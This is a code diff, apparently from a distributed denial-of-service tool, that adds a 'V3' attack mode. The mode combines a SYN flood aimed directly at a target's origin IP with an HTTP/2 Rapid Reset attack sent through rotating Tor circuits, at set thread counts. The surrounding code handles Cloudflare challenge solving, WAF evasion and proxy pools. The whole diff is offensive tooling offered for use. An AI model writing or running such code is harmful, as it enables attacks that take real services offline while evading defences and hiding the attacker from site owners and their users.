@@ -2592,6 +2592,18 @@ async def run_auto_mode(target: str, cfg: dict):
             except Exception as e:
                 _RICH_CONSOLE.print(f"[bold yellow][!][/] CF solver error: {e}")
     
+    # V3 UPGRADE: Combined SYN Flood + Rapid Reset (when origin IP is known)
+    use_v3 = False
+    if origin_ip:
+        print()
+        print(f" {c('c','[*]')} Auto Mode V3 available: Combined SYN Flood + Rapid Reset")
+        print(f"   {c('g','[+]')} SYN flood langsung ke origin IP ({origin_ip})")
+        print(f"   {c('g','[+]')} Rapid Reset via Tor (auto-rotate every 30-60s)")
+        print(f"   {c('g','[+]')} Auto-detect 403/Connection reset -> ganti IP")
+        print(f"   {c('g','[+]')} Auto-logging with timestamps")
+        v3_choice = get_input(" Use V3 combined attack? (Y/n): ").strip().lower()
+        use_v3 = v3_choice != "n"
+    
     # Launch info panel
     _RICH_CONSOLE.print()
     info_table = Table(box=box.SIMPLE, show_header=False, border_style="cyan")
@@ -2600,8 +2612,8 @@ async def run_auto_mode(target: str, cfg: dict):
     info_table.add_row("Target", f"[cyan]{target}[/]")
     info_table.add_row("Origin IP", f"[{'green' if origin_ip else 'red'}]{origin_ip or 'auto-discover'}[/]")
     info_table.add_row("Duration", f"{duration}s")
-    info_table.add_row("Peak RPS", f"{target_rps}")
-    info_table.add_row("Engine", "auto (adaptive)")
+    info_table.add_row("Peak RPS", f"{target_rps if not use_v3 else 'N/A (V3 mode)'}")
+    info_table.add_row("Engine", "[bold green]V3: SYN+RapidReset[/]" if use_v3 else "auto (adaptive)")
     info_table.add_row("Tor", f"[{'green' if tor_instances > 0 else 'red'}]{tor_instances} instances" if tor_instances > 0 else "[red]OFF[/]")
     info_table.add_row("Proxy Pool", f"[{'green' if proxy_pool else 'red'}]{len(proxy_pool) if proxy_pool else 'None'}[/]")
     info_table.add_row("HTTP/2", f"[{'green' if bypass.get('http2_impersonation') else 'red'}]{'ON' if bypass.get('http2_impersonation') else 'OFF'}[/]")
@@ -2610,10 +2622,24 @@ async def run_auto_mode(target: str, cfg: dict):
     info_table.add_row("FlareSolverr", f"[{'green' if flaresolverr_ok else 'red'}]{'ON' if flaresolverr_ok else 'OFF'}[/]")
     info_table.add_row("CF Cookies", f"[{'green' if cf_cookies else 'red'}]{'YES' if cf_cookies else 'NO'}[/]")
     info_table.add_row("Phases", "[dim]RECON → WARMUP → RAMP → PEAK → VALIDATE → COOLDOWN[/]")
-    _RICH_CONSOLE.print(Panel(info_table, title="[bold cyan]Launching Auto Mode V2[/]", border_style="cyan"))
+    _RICH_CONSOLE.print(Panel(info_table, title=f"[bold cyan]Launching Auto Mode {'V3 - SYN+RapidReset' if use_v3 else 'V2'}[/]", border_style="cyan"))
     _RICH_CONSOLE.print()
     
     try:
+        if use_v3:
+            # V3: Combined SYN Flood + Rapid Reset
+            from core.attack.strategies.auto_mode_v3 import run_auto_mode_v3
+            result = await run_auto_mode_v3(
+                target=target,
+                origin_ip=origin_ip,
+                duration=duration,
+                syn_threads=500,
+                rr_threads=100,
+                tor_instances=tor_instances,
+                rotation_interval=45,
+            )
+            return result
+
         # If bypass features are enabled, orchestrate with smart mode first
         if bypass.get("waf_parsing_bypass") or bypass.get("http2_impersonation"):
             _RICH_CONSOLE.print("[bold green][+][/] Smart bypass probing enabled - testing WAF evasion techniques...")
